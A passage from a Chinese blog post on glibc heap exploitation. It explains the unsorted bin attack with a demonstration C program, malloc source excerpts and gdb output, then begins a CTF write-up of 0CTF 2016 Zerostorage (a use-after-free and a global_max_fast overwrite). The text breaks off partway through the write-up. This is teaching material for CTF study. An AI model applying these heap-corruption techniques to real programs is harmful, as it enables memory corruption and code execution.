<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="前言本文首先通过一个unsorted bin attack的例程解释其基本原型。然后通过详细的记录0CTF 2016 - Zerostorage的解题过程，包括解题思路，以及解题中遇到的困难和错误都按照时间线的方式记录下来了，我认为这种原汁原味的writeup相比于标准答案可能更能给大家一些参考信息。 unsorted bin attack例程首先一个例子解释什么是unsorted bin att">
<meta property="og:type" content="article">
<meta property="og:title" content="堆利用系列五：Unsorted Bin Attack ">
<meta property="og:url" content="https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/index.html">
<meta property="og:site_name" content="Colorlight&#39;s Blog">
<meta property="og:description" content="前言本文首先通过一个unsorted bin attack的例程解释其基本原型。然后通过详细的记录0CTF 2016 - Zerostorage的解题过程，包括解题思路，以及解题中遇到的困难和错误都按照时间线的方式记录下来了，我认为这种原汁原味的writeup相比于标准答案可能更能给大家一些参考信息。 unsorted bin attack例程首先一个例子解释什么是unsorted bin att">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/pastimages/2021-05-30-15-41-55.png">
<meta property="og:image" content="https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/pastimages/2021-05-31-15-52-16.png">
<meta property="og:image" content="https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/pastimages/2021-06-02-11-55-10.png">
<meta property="article:published_time" content="2021-06-17T13:09:38.000Z">
<meta property="article:modified_time" content="2021-06-18T08:46:27.422Z">
<meta property="article:author" content="Colorlight">
<meta property="article:tag" content="堆利用">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/pastimages/2021-05-30-15-41-55.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>堆利用系列五：Unsorted Bin Attack </title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Colorlight&#39;s Blog" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/categories/">分类</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇 " href="/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BLarge-Bin-Attack/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇 " href="/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BFastbin-Attack/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/&text=堆利用系列五：Unsorted Bin Attack "><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/&title=堆利用系列五：Unsorted Bin Attack "><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/&is_video=false&description=堆利用系列五：Unsorted Bin Attack "><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=堆利用系列五：Unsorted Bin Attack &body=Check out this article: https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/&title=堆利用系列五：Unsorted Bin Attack "><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/&title=堆利用系列五：Unsorted Bin Attack "><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/&title=堆利用系列五：Unsorted Bin Attack "><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/&title=堆利用系列五：Unsorted Bin Attack "><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/&name=堆利用系列五：Unsorted Bin Attack &description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/&t=堆利用系列五：Unsorted Bin Attack "><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#unsorted-bin-attack%E4%BE%8B%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">unsorted bin attack例程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0ctf-2016-Zerostorage"><span class="toc-number">3.</span> <span class="toc-text">0ctf 2016 - Zerostorage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">4.</span> <span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-number">5.</span> <span class="toc-text">利用思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%AD%A5%E9%AA%A4%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95"><span class="toc-number">6.</span> <span class="toc-text">关键步骤调试记录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%A1%AE%E5%AE%9Aglobal-max-fast%E7%9A%84%E5%9C%B0%E5%9D%80"><span class="toc-number">6.1.</span> <span class="toc-text">如何确定global_max_fast的地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#unsorted-bin-attack%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">6.2.</span> <span class="toc-text">unsorted bin attack的利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%89%E6%8B%A9%E5%90%88%E9%80%82%E7%9A%84fastbin-chunk%E5%A4%A7%E5%B0%8F"><span class="toc-number">7.</span> <span class="toc-text">选择合适的fastbin chunk大小</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fastbin-attack"><span class="toc-number">8.</span> <span class="toc-text">fastbin attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#libc-realloc%E5%87%BD%E6%95%B0%E7%9A%84%E5%88%86%E6%9E%90"><span class="toc-number">9.</span> <span class="toc-text">__libc_realloc函数的分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%A4%E4%B8%AA%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5"><span class="toc-number">9.1.</span> <span class="toc-text">两个特殊情况</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E6%83%85%E5%86%B5"><span class="toc-number">9.2.</span> <span class="toc-text">一般情况</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87realloc%E5%BE%97%E5%88%B0%E4%B8%80%E4%B8%AA0x200%E5%A4%A7%E5%B0%8F%E7%9A%84chunk"><span class="toc-number">10.</span> <span class="toc-text">通过realloc得到一个0x200大小的chunk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0free-hook%E5%86%85%E5%AD%98%E9%99%84%E8%BF%91%E7%9A%84%E6%8E%A7%E5%88%B6%E6%9D%83"><span class="toc-number">11.</span> <span class="toc-text">拿到free_hook内存附近的控制权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">12.</span> <span class="toc-text">结语</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81"><span class="toc-number">13.</span> <span class="toc-text">我的利用代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">14.</span> <span class="toc-text">参考</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#libc-unsorted-bin%E7%9A%84%E5%87%BA%E5%85%A5%E9%A1%BA%E5%BA%8F"><span class="toc-number">15.</span> <span class="toc-text">libc unsorted bin的出入顺序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#malloc-%E5%87%BD%E6%95%B0%E7%9A%84%E5%9F%BA%E6%9C%AC%E9%80%BB%E8%BE%91"><span class="toc-number">16.</span> <span class="toc-text">malloc 函数的基本逻辑</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        堆利用系列五：Unsorted Bin Attack 
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Colorlight</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-06-17T13:09:38.000Z" itemprop="datePublished">2021-06-17</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E5%A0%86%E5%88%A9%E7%94%A8/">堆利用</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/%E5%A0%86%E5%88%A9%E7%94%A8/" rel="tag">堆利用</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文首先通过一个unsorted bin attack的例程解释其基本原型。然后通过详细的记录0CTF 2016 - Zerostorage的解题过程，包括解题思路，以及解题中遇到的困难和错误都按照时间线的方式记录下来了，我认为这种原汁原味的writeup相比于标准答案可能更能给大家一些参考信息。</p>
<h3 id="unsorted-bin-attack例程"><a href="#unsorted-bin-attack例程" class="headerlink" title="unsorted bin attack例程"></a>unsorted bin attack例程</h3><p>首先一个例子解释什么是unsorted bin attack,大家自行根据我之前的系列文章改用2.23版本的libc进行运行调试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">unsigned long remissions;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">        puts(&quot;So we will be covering an unsorted bin attack.&quot;);</span><br><span class="line">        puts(&quot;The unsorted bin is a doubly linked list.&quot;);</span><br><span class="line">        puts(&quot;This attack will allow us to write a pointer to the address of our choosing.&quot;);</span><br><span class="line">        puts(&quot;While this attack really doesn&#x27;t give us much control over what we write, we can count on it being a ptr (which will probably be a &#x27;large&#x27; integer)&quot;);</span><br><span class="line">        puts(&quot;Let&#x27;s get started.\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;So our goal will be to overwrite the value of the &#x27;remissions&#x27; global variable.\n&quot;);</span><br><span class="line">    printf(&quot;It is at the bss address: \t%p\n&quot;, &amp;remissions);</span><br><span class="line">    printf(&quot;With the value: \t\t%0lx\n\n&quot;, remissions);</span><br><span class="line"></span><br><span class="line">    printf(&quot;We will start by allocating two chunks. One to insert into the unsorted bin.\n&quot;);</span><br><span class="line">    printf(&quot;The other to prevent consolidation with the top chunk.\n&quot;);</span><br><span class="line"></span><br><span class="line">        unsigned long *ptr0 = malloc(0xf0);</span><br><span class="line">    unsigned long *ptr1 = malloc(0x10);</span><br><span class="line"></span><br><span class="line">        printf(&quot;We have allocated our first chunk at:\t%p\n&quot;, ptr0);</span><br><span class="line"></span><br><span class="line">        printf(&quot;Now let&#x27;s free it to insert it into the unsorted bin.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">        free(ptr0);</span><br><span class="line"></span><br><span class="line">        printf(&quot;Now that it has been inserted into the unsorted bin, we can see it&#x27;s fwd and bk pointers.\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;fwd:\t0x%lx\n&quot;, ptr0[0]);</span><br><span class="line">    printf(&quot;bk:\t0x%lx\n\n&quot;, ptr0[1]);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now when a chunk gets removed from the unsorted bin, a pointer to gets written to it&#x27;s back chunk.\n&quot;);</span><br><span class="line">    printf(&quot;Specifically a pointer will get written to bk + 0x10 on x64 (bk + 0x8 for x86).\n&quot;);</span><br><span class="line">    printf(&quot;That is where we get our ptr write from.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;So by using a bug, we can edit the bk pointer of the freed chunk to point to remissions - 0x10.\n&quot;);</span><br><span class="line">    printf(&quot;That way when the chunk leaves the unsorted bin, the pointer will be written to remissions.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    ptr0[1] = (unsigned long)(&amp;remissions - 0x2);</span><br><span class="line"></span><br><span class="line">    printf(&quot;The current fwd and bk pointers after the write.\n&quot;);</span><br><span class="line">    printf(&quot;fwd:\t0x%lx\n&quot;, ptr0[0]);</span><br><span class="line">    printf(&quot;bk:\t0x%lx\n\n&quot;, ptr0[1]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    printf(&quot;Now we allocate a new chunk of the same size to remove our freed chunk from the unsorted bin.&quot;);</span><br><span class="line">    printf(&quot;This will trigger the write to remissions, which has a current value of 0x%lx\n&quot;, remissions);</span><br><span class="line"></span><br><span class="line">    malloc(0xf0);//------------------------&gt;c1</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now we can see that the value of remissions has changed.\n&quot;);</span><br><span class="line">    printf(&quot;remissions:\t0x%lx\n&quot;, remissions);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们根据之前学习到的堆的知识，直接自己画图分析整个程序的所作所为。<br><img src="pastimages/2021-05-30-15-41-55.png"><br>当我们在c1处再次malloc(0xf0)的时候，实际上就是把原来在unsorted bin上的chunk0给分配回来，这就涉及到了把原来的chunk从unsorted bin上给解链下来。根据之前的文章我们分析过，解链需要涉及到两个指针的写入，分别是chunk0的fd指向chunk的bk指针，以及chunk0的bk指向的chunk的fd指针。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk0-&gt;fd-&gt;bk = chunk0-&gt;bk</span><br><span class="line">chunk0-&gt;bk-&gt;fd = chunk0-&gt;fd</span><br></pre></td></tr></table></figure>
<p>有同学可能会问，这不就是unlink操作吗，unlink操作不是要进行一次证明“你的前面一个人的后一个人就是你自己的校验吗”<br>没错这个本质上就是unlink，但是unlink只会在consolidate的时候调用，在glibc源码中，unlink函数只在free函数和malloc_consolidate的时候被调用，在malloc的从unsorted bin中分配并没有调用</p>
<p>malloc_consolidate中的两次调用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">static void malloc_consolidate(mstate av)</span><br><span class="line">&#123;</span><br><span class="line">  mfastbinptr*    fb;                 /* current fastbin being consolidated */</span><br><span class="line">  mfastbinptr*    maxfb;              /* last fastbin (for loop control) */</span><br><span class="line">  mchunkptr       p;                  /* current chunk being consolidated */</span><br><span class="line">  mchunkptr       nextp;              /* next chunk to consolidate */</span><br><span class="line">  mchunkptr       unsorted_bin;       /* bin header */</span><br><span class="line">  mchunkptr       first_unsorted;     /* chunk to link to */</span><br><span class="line"></span><br><span class="line">  /* These have same use as in free() */</span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  ...</span><br><span class="line"> </span><br><span class="line">  if (!prev_inuse(p)) &#123;</span><br><span class="line">	    prevsize = p-&gt;prev_size;</span><br><span class="line">	    size += prevsize;</span><br><span class="line">	    p = chunk_at_offset(p, -((long) prevsize));</span><br><span class="line">	    unlink(av, p, bck, fwd);                      //--------------&gt;调用unlink</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">   if (nextchunk != av-&gt;top) &#123;</span><br><span class="line">	    nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">	    if (!nextinuse) &#123;</span><br><span class="line">	      size += nextsize;</span><br><span class="line">	      unlink(av, nextchunk, bck, fwd);            //-------------&gt; 调用unlink</span><br><span class="line">	    &#125; else</span><br><span class="line">	      clear_inuse_bit_at_offset(nextchunk, 0);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>free函数中的两次调用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">static void</span><br><span class="line">_int_free (mstate av, mchunkptr p, int have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        /* its size */</span><br><span class="line">  mfastbinptr *fb;             /* associated fastbin */</span><br><span class="line">  mchunkptr nextchunk;         /* next contiguous chunk */</span><br><span class="line">  INTERNAL_SIZE_T nextsize;    /* its size */</span><br><span class="line">  int nextinuse;               /* true if nextchunk is used */</span><br><span class="line">  INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */</span><br><span class="line">  mchunkptr bck;               /* misc temp for linking */</span><br><span class="line">  mchunkptr fwd;  </span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line">      /* consolidate backward */</span><br><span class="line">    if (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = p-&gt;prev_size;</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((long) prevsize));</span><br><span class="line">      unlink(av, p, bck, fwd);      //---------------------------&gt;调用unlink</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (nextchunk != av-&gt;top) &#123;</span><br><span class="line">      /* get and clear inuse bit */</span><br><span class="line">      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">      /* consolidate forward */</span><br><span class="line">      if (!nextinuse) &#123;</span><br><span class="line">	unlink(av, nextchunk, bck, fwd);    //---------------------------&gt;调用unlink</span><br><span class="line">	size += nextsize;</span><br><span class="line">      &#125; else</span><br><span class="line">	clear_inuse_bit_at_offset(nextchunk, 0);</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p>而对于从unsorted bin中malloc的逻辑，是直接这样改写的指针，并没有借用unlink函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/* remove from unsorted list */</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure>

<p>我们通过调试观察是否&amp;remissions</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/gx &amp;remissions </span><br><span class="line">0x555555756018 &lt;remissions&gt;:    0x00007ffff7dd1b78</span><br></pre></td></tr></table></figure>
<p>而指向的unsorted bin的前面的地址是main_arena + 88的地址<br>main_arena的地址为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  heap arenas </span><br><span class="line">Arena (base=0x7ffff7dd1b20</span><br></pre></td></tr></table></figure>
<p>0x7ffff7dd1b20 + 88 = 0x7ffff7dd1b78<br>这种unsorted bin一种典型的应用就是泄露libc的地址。</p>
<h3 id="0ctf-2016-Zerostorage"><a href="#0ctf-2016-Zerostorage" class="headerlink" title="0ctf 2016 - Zerostorage"></a>0ctf 2016 - Zerostorage</h3><p>题目的<a target="_blank" rel="noopener" href="https://github.com/ctfs/write-ups-2016/blob/master/0ctf-2016/exploit/zerostorage-6/zerostorage.tar.gz">下载地址</a></p>
<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>在merge函数中，如果两个index相同，则会造成UAF，即原来的chunk被free放到unsorted bin中，同时误以为已经merge，被free的chunk还是可以被访问。</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>由于本题有分配大小的限制，小于0x80的不能分配，因此直接使用fastbin attack将会受到限制，但是我们可以通过unsorted bin先修改global_max_fast的值，使得即使分配大于0x80的chunk，仍然使用的是fast bin，这样就绕过了长度限制，后面就是常规的fastbin attck利用技术。难点主要是global_max_fast的改写，具体流程见下图<br><img src="pastimages/2021-05-31-15-52-16.png"></p>
<h3 id="关键步骤调试记录"><a href="#关键步骤调试记录" class="headerlink" title="关键步骤调试记录"></a>关键步骤调试记录</h3><h4 id="如何确定global-max-fast的地址"><a href="#如何确定global-max-fast的地址" class="headerlink" title="如何确定global_max_fast的地址"></a>如何确定global_max_fast的地址</h4><p>在网上看了几篇文章的解，我只看到了直接通过gdb打印出global_max_fast的地址的解，但是我用自己下载的libc，并没有这个global_max_fast符号，因为这是一个static变量，是可以被strip去符号的。不太清楚别人是怎么搞得，我只能通过原理上去找这个地址。</p>
<p>首先通过ida打开libc的二进制文件，然后在源码中查找处理global_max_fast这个值的函数。<br>我在mallopt函数中找到了set_max_fast</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">__libc_mallopt (int param_number, int value)</span><br><span class="line">&#123;</span><br><span class="line">  mstate av = &amp;main_arena;</span><br><span class="line">  int res = 1;</span><br><span class="line"></span><br><span class="line">  if 